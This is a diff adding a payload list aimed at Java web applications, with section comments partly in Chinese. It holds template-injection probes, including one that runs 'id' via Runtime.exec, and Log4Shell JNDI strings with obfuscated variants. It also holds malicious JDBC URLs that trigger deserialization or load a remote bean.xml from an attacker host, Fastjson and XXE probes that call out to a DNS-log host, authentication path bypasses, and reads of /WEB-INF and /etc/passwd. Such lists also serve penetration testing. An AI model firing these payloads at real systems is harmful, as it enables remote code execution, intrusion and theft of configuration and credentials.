@@ -1,0 +1,48 @@
+${7*7}
+${pageContext.request.getSession().getServletContext().getRealPath("/")}
+#{255*255}
+#{9999-1}
+#{'cnvd.org.cn'.toUpperCase()}
+${pageContext.request.serverName}
+${header['User-Agent']}
+#{T(java.lang.Thread).sleep(5000)}
+#{new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}
+(7*7)
+@java.lang.Thread@sleep(5000)
+
+# SSTI (Thymeleaf/Freemarker/Velocity)
+${non_existent_variable}
+[[${7*7}]]
+__${7*7}__
+#set($x=9999-1)$x
+${.version}
+#set($x=7*7)$x
+${jndi:ldap://[DNSLog_Address]/a}
+${jndi:${lower:l}${lower:d}ap://[DNSLog_Address]/a}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${特殊:a}${特殊:p}://[DNSLog_Address]/a}
+
+# MySQL (autoDeserialize 触发)
+jdbc:mysql://[Attacker_IP]:3306/test?autoDeserialize=true&queryInterceptors=com.mysql.cj.jdbc.interceptors.ServerStatusDiffInterceptor&user=yso_CommonsCollections3_calc
+
+# PostgreSQL (SocketFactory 触发)
+jdbc:postgresql://[Attacker_IP]:5432/test?socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext&socketFactoryArg=http://[Attacker_IP]/bean.xml
+
+# IBM DB2 (JNDI 触发)
+jdbc:db2://[Attacker_IP]:50000/db:clientRerouteServerListJNDIName=jndi:ldap://[DNSLog_Address]/a;
+
+
+
+{"@type":"java.net.Inet4Address","val":"[DNSLog_Address]"}
+{"@type":"java.net.InetSocketAddress"{"address":,"val":"[DNSLog_Address]"}}
+
+<?xml version="1.0"?><!DOCTYPE r [<!ENTITY % x SYSTEM "http://[DNSLog_Address]">%x;]><r/>
+
+
+# 路径绕过 (Shiro/Tomcat)
+/admin/;
+/admin/%20/
+/api/../admin/
+
+/WEB-INF/web.xml
+/WEB-INF/classes/application.properties
+../../../../etc/passwd
